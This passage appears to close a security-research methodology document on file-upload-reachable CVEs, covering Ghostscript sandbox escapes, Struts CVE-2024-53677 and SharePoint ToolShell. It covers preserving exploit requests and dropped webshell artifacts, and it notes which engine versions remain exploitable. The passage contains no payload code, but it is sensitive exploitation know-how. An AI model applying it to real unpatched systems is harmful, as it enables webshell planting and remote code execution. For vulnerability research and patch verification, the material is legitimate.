- For the Struts primitive, preserve the multipart body (with `top.fileFileName`), the server's response, and the stored-shell path. The chain is reproducible from the request and the resulting file.
- For the SharePoint primitive, preserve the ToolPane POST request, the dropped `.aspx` artifact's content and SHA256, and (optionally) the MachineKey-leak step's output. The delivery primitive is complete at the artifact drop; the full chain requires the deserialization leg routed to `insecure_deserialization.md`.
- Persist every measurement script and captured output to the Batch 10 artifact directory per §5-§6; a measured negative result (the exploit does not reproduce on patched versions) is as load-bearing as a positive and should be preserved alongside the attack artifact.

## Summary

The 2024–2026 upload-reachable CVE catalog clusters around three primitives: Ghostscript sandbox escapes that remain live on pre-10.03.1 and pre-10.01.2 engines (CVE-2024-29510, CVE-2023-36664), the Struts multipart-mass-assignment-to-webroot class (CVE-2024-53677), and the SharePoint ToolShell delivery/activation primitive (CVE-2025-53770) whose full-RCE chain routes through the ASP.NET deserialization sink. Version-boundary-as-finding is the methodology, and the §5 measurement for Ghostscript uniprint is the canonical confirmation that the patched engine rejects the primitive and the unpatched engine executes it. The historical catalog (CVE-2016-3714 ImageTragick, CVE-2018-16509 Ghostscript `-dSAFER` lineage) remains reachable against legacy targets where distros' selective security backports miss the specific primitive class; version-match before concluding a target is closed, and read deployed `policy.xml` content rather than trusting presence as mitigation.
